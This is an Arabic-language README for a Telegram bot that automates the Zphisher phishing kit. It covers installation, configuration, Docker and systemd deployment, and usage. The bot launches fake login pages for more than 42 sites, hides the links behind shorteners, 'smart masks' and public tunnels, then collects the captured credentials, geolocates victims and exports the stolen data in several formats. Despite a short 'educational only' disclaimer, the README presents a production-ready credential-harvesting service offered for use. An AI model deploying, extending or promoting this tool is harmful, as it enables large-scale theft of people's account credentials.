# 🤖 Zphisher Pro Bot

بوت تيليجرام متقدم لإدارة أداة Zphisher بواجهة تفاعلية احترافية ومميزات متطورة.

![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
![Aiogram](https://img.shields.io/badge/Aiogram-3.x-green.svg)
![License](https://img.shields.io/badge/License-Educational-red.svg)
![Status](https://img.shields.io/badge/Status-Production%20Ready-brightgreen.svg)

## 📋 جدول المحتويات

- [✨ الميزات الرئيسية](#-الميزات-الرئيسية)
- [🛠️ المتطلبات](#️-المتطلبات)
- [📦 التثبيت](#-التثبيت)
- [⚙️ الإعداد](#️-الإعداد)
- [🚀 تشغيل البوت](#-تشغيل-البوت)
- [📖 دليل الاستخدام](#-دليل-الاستخدام)
- [🏗️ البنية المعمارية](#️-البنية-المعمارية)
- [🔧 التخصيص والتطوير](#-التخصيص-والتطوير)
- [🛡️ الأمان](#️-الأمان)
- [📈 المراقبة والتحليل](#-المراقبة-والتحليل)
- [🤝 المساهمة](#-المساهمة)
- [📄 الترخيص](#-الترخيص)

## ✨ الميزات الرئيسية

### 🌐 إدارة شاملة لـ Zphisher
- **42+ موقع مدعوم** مع إمكانية إضافة المزيد
- **3 أنواع أنفاق**: Localhost، Cloudflared، LocalXpose
- **إدارة جلسات متعددة** في الوقت الفعلي
- **تخصيص كامل** للمنافذ والأقنعة

### 📊 تحليلات متقدمة
- **إحصائيات فورية** للزوار والبيانات المُلتقطة
- **تحليل جغرافي** مفصل مع GeoIP
- **تحليل الأجهزة والمتصفحات**
- **نقاط الجودة والكفاءة**

### 🔗 نظام الروابط المتطور
- **اختصار روابط متعدد الخدمات**: TinyURL، Bit.ly، Short.io، Cutt.ly، Rebrandly
- **أقنعة ذكية** مع هندسة اجتماعية
- **روابط احتياطية** عند فشل الخدمة الأساسية

### 📁 إدارة ملفات متقدمة
- **تصدير متعدد الصيغ**: Excel، CSV، JSON، PDF، XML، TXT
- **نسخ احتياطية شاملة** مع ضغط
- **مراقبة الملفات** في الوقت الفعلي
- **تنظيف تلقائي** للملفات المؤقتة

### 🔔 نظام إشعارات ذكي
- **إشعارات فورية** للبيانات الجديدة والزوار
- **تنبيهات أمنية** للأنشطة المشبوهة
- **تقارير دورية** (يومية، أسبوعية، شهرية)
- **تحكم في معدل الإرسال**

### ☁️ تخزين سحابي متنوع
- **Amazon S3** لتخزين احترافي
- **Google Drive** للتخزين الشخصي
- **Dropbox** للمزامنة السهلة
- **تخزين محلي** كخيار افتراضي

### 👑 لوحة إدارية شاملة
- **إدارة المستخدمين** مع أدوار متعددة
- **مراقبة النظام** والأداء
- **إعدادات أمنية** متقدمة
- **سجلات مفصلة** لجميع العمليات

### 🛡️ أمان متقدم
- **نظام أدوار**: Super Admin، Admin، User
- **توثيق متعدد المستويات**
- **تشفير البيانات الحساسة**
- **حماية من التسريب**

## 🛠️ المتطلبات

### متطلبات النظام
- **نظام التشغيل**: Linux (Ubuntu 20.04+ مُفضل)
- **Python**: 3.8 أو أحدث
- **الذاكرة**: 2GB RAM كحد أدنى
- **التخزين**: 10GB مساحة فارغة
- **الشبكة**: اتصال إنترنت مستقر

### المتطلبات الخارجية
- **Zphisher**: أداة التصيد الأساسية
- **PHP**: لتشغيل صفحات الويب
- **Cloudflared**: للأنفاق الآمنة (اختياري)
- **LocalXpose**: للأنفاق المحلية (اختياري)

### حسابات الخدمات (اختيارية)
- **Telegram Bot Token** من [@BotFather](https://t.me/BotFather)
- **خدمات اختصار الروابط**: Bit.ly، Short.io، إلخ
- **خدمات التخزين السحابي**: AWS S3، Google Drive، إلخ
- **MaxMind GeoIP**: للتحليل الجغرافي المتقدم

## 📦 التثبيت

### 1. تحضير النظام

```bash
# تحديث النظام
sudo apt update && sudo apt upgrade -y

# تثبيت المتطلبات الأساسية
sudo apt install -y python3 python3-pip python3-venv git curl

# تثبيت PHP
sudo apt install -y php php-cli php-curl php-mbstring
```

### 2. تحميل المشروع

```bash
# استنساخ المستودع
git clone https://github.com/your-repo/zphisher-pro-bot.git
cd zphisher-pro-bot

# إنشاء بيئة افتراضية
python3 -m venv venv
source venv/bin/activate

# تثبيت المتطلبات
pip install -r bot/requirements.txt
```

### 3. تثبيت Zphisher

```bash
# تحميل Zphisher
git clone https://github.com/htr-tech/zphisher.git
chmod +x zphisher/zphisher.sh

# ربط المسار في الإعدادات
export ZPHISHER_PATH=$(pwd)/zphisher
```

### 4. تثبيت أدوات الأنفاق (اختياري)

```bash
# Cloudflared
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared
sudo chmod +x /usr/local/bin/cloudflared

# LocalXpose
curl -s https://api.github.com/repos/localxpose/localxpose/releases/latest | grep browser_download_url | grep linux | cut -d '"' -f 4 | wget -i -
sudo mv loclx-linux-amd64 /usr/local/bin/loclx
sudo chmod +x /usr/local/bin/loclx
```

## ⚙️ الإعداد

### 1. إعداد متغيرات البيئة

```bash
# نسخ ملف الإعدادات
cd bot
cp .env.example .env

# تحرير الإعدادات
nano .env
```

### 2. الإعدادات الأساسية

```bash
# 🤖 إعدادات البوت الأساسية
BOT_TOKEN=1234567890:YOUR_BOT_TOKEN_HERE
SUPER_ADMIN_ID=123456789
ADMIN_IDS=987654321,456789123

# 🗄️ قاعدة البيانات
DATABASE_URL=sqlite+aiosqlite:///./zphisher_bot.db

# 🔒 مفاتيح الأمان
SECRET_KEY=your_super_secret_key_32_chars_long
JWT_SECRET=another_super_secret_jwt_key_32_chars
ENCRYPTION_KEY=your_fernet_encryption_key_44_chars_base64

# 📁 المسارات
ZPHISHER_PATH=/path/to/zphisher
CLOUDFLARED_PATH=/usr/local/bin/cloudflared
LOCALXPOSE_PATH=/usr/local/bin/loclx
```

### 3. إعدادات متقدمة

```bash
# 🔗 اختصار الروابط
URL_SHORTENER=tinyurl
BITLY_ACCESS_TOKEN=your_bitly_token
SHORTIO_API_KEY=your_shortio_key

# ☁️ التخزين السحابي
CLOUD_STORAGE_TYPE=local
AWS_ACCESS_KEY_ID=your_aws_key
AWS_SECRET_ACCESS_KEY=your_aws_secret
AWS_BUCKET_NAME=your_bucket

# 🌍 GeoIP
GEOIP_ENABLED=true
MAXMIND_LICENSE_KEY=your_maxmind_key
```

### 4. إنشاء قاعدة البيانات

```bash
# تشغيل الهجرات
python -c "
import asyncio
from database import create_tables
asyncio.run(create_tables())
"
```

## 🚀 تشغيل البوت

### تشغيل عادي

```bash
# في مجلد البوت
cd bot
python main.py
```

### تشغيل بخدمة النظام

```bash
# إنشاء ملف الخدمة
sudo nano /etc/systemd/system/zphisher-bot.service
```

```ini
[Unit]
Description=Zphisher Pro Bot
After=network.target

[Service]
Type=simple
User=your_username
WorkingDirectory=/path/to/zphisher-pro-bot/bot
Environment=PATH=/path/to/zphisher-pro-bot/venv/bin
ExecStart=/path/to/zphisher-pro-bot/venv/bin/python main.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
# تفعيل وتشغيل الخدمة
sudo systemctl daemon-reload
sudo systemctl enable zphisher-bot
sudo systemctl start zphisher-bot

# مراقبة السجلات
sudo journalctl -u zphisher-bot -f
```

### تشغيل مع Docker

```bash
# بناء الصورة
docker build -t zphisher-pro-bot .

# تشغيل الحاوية
docker run -d \
  --name zphisher-bot \
  --env-file .env \
  --volume $(pwd)/data:/app/data \
  --restart unless-stopped \
  zphisher-pro-bot
```

## 📖 دليل الاستخدام

### للمدراء

#### 1. إعداد البوت أول مرة
1. ابدأ محادثة مع البوت `/start`
2. ستحصل على صلاحيات المدير الأعلى تلقائياً
3. اذهب لــ "👑 لوحة الإدارة"
4. قم بإعداد النظام والمستخدمين

#### 2. إدارة المستخدمين
- **إضافة مستخدمين**: لوحة الإدارة → إدارة المستخدمين → إضافة مستخدم
- **تغيير الأدوار**: اختر المستخدم → رفع لمدير / تنزيل لمستخدم
- **حظر/إلغاء حظر**: اختر المستخدم → حظر المستخدم

#### 3. مراقبة النظام
- **الإحصائيات**: لوحة الإدارة → التحليلات
- **حالة النظام**: لوحة الإدارة → إدارة النظام
- **السجلات**: إدارة النظام → سجلات النظام

### للمستخدمين

#### 1. إنشاء جلسة جديدة
1. الضغط على "🌐 جلسة جديدة"
2. اختيار نوع الموقع من القائمة
3. تحديد نوع النفق (Localhost/Cloudflared/LocalXpose)
4. تخصيص المنفذ والقناع (اختياري)
5. تأكيد الإعدادات وبدء الجلسة

#### 2. مراقبة الجلسات النشطة
- **عرض الجلسات**: "📱 جلساتي النشطة"
- **إيقاف جلسة**: اختر الجلسة → إيقاف الجلسة
- **عرض البيانات**: اختر الجلسة → البيانات المُلتقطة

#### 3. تصدير البيانات
- **تصدير جلسة**: اختر الجلسة → تصدير البيانات
- **اختيار الصيغة**: Excel, CSV, JSON, PDF
- **تحميل الملف**: سيتم إرسال الملف عبر التيليجرام

## 🏗️ البنية المعمارية

### هيكل المشروع

```
zphisher-pro-bot/
├── bot/                          # مجلد البوت الرئيسي
│   ├── main.py                   # نقطة الدخول الرئيسية
│   ├── config.py                 # إعدادات البوت والنظام
│   ├── requirements.txt          # متطلبات Python
│   ├── .env.example             # قالب متغيرات البيئة
│   │
│   ├── database/                 # نظام قاعدة البيانات
│   │   ├── __init__.py
│   │   ├── models.py            # نماذج SQLAlchemy
│   │   ├── operations.py        # عمليات قاعدة البيانات
│   │   └── connection.py        # إدارة الاتصالات
│   │
│   ├── utils/                    # أدوات مساعدة
│   │   ├── __init__.py
│   │   ├── security.py          # نظام الأمان والتوثيق
│   │   ├── zphisher_control.py  # التحكم في Zphisher
│   │   ├── analytics.py         # التحليلات والإحصائيات
│   │   ├── url_shortener.py     # نظام اختصار الروابط
│   │   ├── file_monitor.py      # مراقبة الملفات
│   │   ├── file_manager.py      # إدارة الملفات والتصدير
│   │   ├── notifications.py     # نظام الإشعارات
│   │   └── cloud_storage.py     # التخزين السحابي
│   │
│   ├── keyboards/                # لوحات المفاتيح التفاعلية
│   │   ├── __init__.py
│   │   ├── main_menu.py         # القائمة الرئيسية
│   │   ├── site_selection.py    # اختيار المواقع
│   │   └── admin_keyboards.py   # لوحات الإدارة
│   │
│   ├── handlers/                 # معالجات الأحداث
│   │   ├── __init__.py
│   │   └── admin_handlers.py    # معالجات إدارية
│   │
│   ├── logs/                     # ملفات السجلات
│   ├── temp/                     # ملفات مؤقتة
│   ├── uploads/                  # ملفات مرفوعة
│   └── backups/                  # نسخ احتياطية
│
├── zphisher/                     # أداة Zphisher الأساسية
├── docs/                         # وثائق المشروع
├── docker/                       # ملفات Docker
├── scripts/                      # سكريبتات مساعدة
└── README.md                     # هذا الملف
```

### تدفق البيانات

1. **المستخدم** يتفاعل مع البوت عبر تيليجرام
2. **Aiogram** يستقبل الرسائل ويوجهها للمعالجات
3. **المعالجات** تعالج الطلبات وتتفاعل مع الأنظمة الفرعية
4. **ZphisherController** يدير عمليات التصيد
5. **FileMonitor** يراقب الملفات ويعالج البيانات
6. **NotificationManager** يرسل إشعارات فورية
7. **DatabaseManager** يحفظ البيانات
8. **AnalyticsEngine** يحلل البيانات ويولد التقارير

## 🔧 التخصيص والتطوير

### إضافة موقع جديد

1. تحديث `config.py`:

```python
CUSTOM_SITES = {
    'new_site': {
        'name': '🆕 موقع جديد',
        'key': 'new_site',
        'category': 'social'
    }
}
```

2. إضافة ملفات الموقع في Zphisher:

```bash
# إنشاء مجلد الموقع الجديد
mkdir zphisher/sites/new_site
# إضافة ملفات HTML/CSS/JS
```

### إضافة خدمة اختصار جديدة

```python
# في url_shortener.py
async def _shorten_new_service(self, url: str) -> Dict[str, Any]:
    """اختصار باستخدام خدمة جديدة"""
    
    session = await self.get_session()
    api_url = "https://api.newservice.com/shorten"
    
    # تنفيذ الطلب
    # ...
    
    return {
        'success': True,
        'short_url': result_url,
        'service': 'NewService'
    }
```

### إضافة مزود تخزين سحابي

```python
# في cloud_storage.py
class NewCloudStorage(BaseStorage):
    """تخزين سحابي جديد"""
    
    async def upload(self, local_path: Path, remote_path: str) -> Dict[str, Any]:
        # تنفيذ رفع الملف
        pass
    
    # باقي الطرق المطلوبة...
```

### إضافة معالج إداري جديد

```python
# في admin_handlers.py
async def new_admin_feature_handler(callback: types.CallbackQuery, user):
    """معالج ميزة إدارية جديدة"""
    
    if not permission_manager.has_permission(user, 'new_feature'):
        await callback.message.edit_text("❌ ليس لديك صلاحية")
        return
    
    # تنفيذ الميزة الجديدة
    # ...
```

## 🛡️ الأمان

### ميزات الأمان المدمجة

1. **تشفير البيانات الحساسة** باستخدام Fernet
2. **توثيق متعدد المستويات** مع JWT
3. **حماية من هجمات Rate Limiting**
4. **سجلات مفصلة** لجميع العمليات
5. **عزل الصلاحيات** حسب الأدوار

### أفضل الممارسات الأمنية

```bash
# 1. تأمين ملف البيئة
chmod 600 .env

# 2. استخدام HTTPS للـ Webhooks
USE_WEBHOOK=true
WEBHOOK_URL=https://yourdomain.com/webhook

# 3. تشفير النسخ الاحتياطية
BACKUP_COMPRESSION=true
ENCRYPTION_ENABLED=true

# 4. مراقبة السجلات
tail -f logs/bot.log | grep "WARNING\|ERROR"
```

### تحديثات الأمان

```bash
# تحديث المتطلبات بانتظام
pip install --upgrade -r requirements.txt

# فحص الثغرات الأمنية
pip-audit

# تحديث قاعدة بيانات GeoIP
python scripts/update_geoip.py
```

## 📈 المراقبة والتحليل

### مراقبة الأداء

```bash
# مراقبة استخدام الموارد
htop

# مراقبة مساحة القرص
df -h

# مراقبة سجلات البوت
tail -f logs/bot.log
```

### التحليلات المتوفرة

1. **إحصائيات الجلسات**: عدد الجلسات، معدل النجاح، الأوقات النشطة
2. **التحليل الجغرافي**: توزيع الزوار حسب البلدان والمدن
3. **تحليل الأجهزة**: أنواع الأجهزة والمتصفحات
4. **تحليل السلوك**: أنماط الزوار والتفاعل
5. **تقارير دورية**: يومية، أسبوعية، شهرية

### لوحة المراقبة

- **الإحصائيات الفورية** في القائمة الرئيسية
- **تقارير مفصلة** في لوحة الإدارة
- **تنبيهات تلقائية** للأحداث المهمة
- **تصدير التقارير** بصيغ متعددة

## 🤝 المساهمة

نرحب بمساهماتكم! يرجى اتباع الخطوات التالية:

### 1. إعداد بيئة التطوير

```bash
# استنساخ المستودع
git clone https://github.com/your-repo/zphisher-pro-bot.git
cd zphisher-pro-bot

# إنشاء فرع جديد
git checkout -b feature/new-feature

# تثبيت متطلبات التطوير
pip install -r requirements-dev.txt
```

### 2. معايير الكود

- **PEP 8** لتنسيق Python
- **Type hints** لجميع الدوال
- **Docstrings** للوثائق
- **التعليقات** باللغة العربية

### 3. الاختبار

```bash
# تشغيل الاختبارات
python -m pytest tests/

# فحص جودة الكود
flake8 bot/
black bot/
```

### 4. إرسال المساهمة

```bash
# إضافة التغييرات
git add .
git commit -m "feat: add new feature"

# رفع الفرع
git push origin feature/new-feature

# إنشاء Pull Request
```

## 📄 الترخيص

هذا المشروع مخصص **للأغراض التعليمية فقط**. 

⚠️ **تحذير مهم**: 
- لا تستخدم هذه الأداة لأغراض غير قانونية
- المطور غير مسؤول عن سوء الاستخدام
- استخدم هذه الأداة لتعلم الأمان السيبراني فقط

## 🆘 الدعم والمساعدة

### المشاكل الشائعة

**1. خطأ في الاتصال بقاعدة البيانات**
```bash
# التحقق من صحة رابط قاعدة البيانات
python -c "from database import health_checker; import asyncio; asyncio.run(health_checker.check())"
```

**2. فشل في بدء Zphisher**
```bash
# التحقق من صلاحيات الملفات
chmod +x zphisher/zphisher.sh
```

**3. مشاكل الأنفاق**
```bash
# التحقق من تثبيت cloudflared
cloudflared --version
```

### طلب المساعدة

- **Issues**: لتقارير الأخطاء واقتراح الميزات
- **Discussions**: للأسئلة العامة والنقاش
- **Wiki**: للدروس التعليمية والأمثلة

### المساهمون

شكراً لجميع المساهمين في هذا المشروع:

- [@developer1](https://github.com/developer1) - التطوير الأساسي
- [@designer1](https://github.com/designer1) - تصميم الواجهة
- [@tester1](https://github.com/tester1) - الاختبار والجودة

---

<div align="center">

**⭐ لا تنس إضافة نجمة للمشروع إذا أعجبك! ⭐**

**📧 للتواصل**: [your-email@example.com](mailto:your-email@example.com)

**🔗 الروابط المفيدة**: [الوثائق](https://docs.example.com) | [الدروس](https://tutorials.example.com) | [المجتمع](https://community.example.com)

</div>

---

> **ملاحظة**: هذا المشروع في تطوير مستمر. نقوم بإضافة ميزات جديدة وتحسينات بانتظام. تابع التحديثات!